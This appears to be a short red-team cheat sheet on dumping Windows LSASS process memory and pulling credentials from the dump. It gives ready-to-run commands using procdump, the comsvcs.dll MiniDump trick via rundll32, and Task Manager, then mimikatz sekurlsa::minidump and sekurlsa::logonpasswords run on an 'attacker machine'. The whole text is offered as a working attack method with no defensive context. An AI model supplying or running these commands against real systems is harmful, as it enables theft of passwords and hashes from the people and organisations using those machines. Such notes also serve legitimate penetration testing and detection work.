Dump LSASS Process Memory
# Using Mimikatz
sekurlsa::minidump lsass.dmp

# Using Task Manager (if available)
# Open Task Manager -> Details -> lsass.exe -> Create dump file

# Using procdump (better)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using PowerShell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full

Analyse LSASS Offline
# On your attacker machine
mimikatz.exe

# Load the dump
sekurlsa::minidump C:\path\to\lsass.dmp

# Extract credentials
sekurlsa::logonpasswords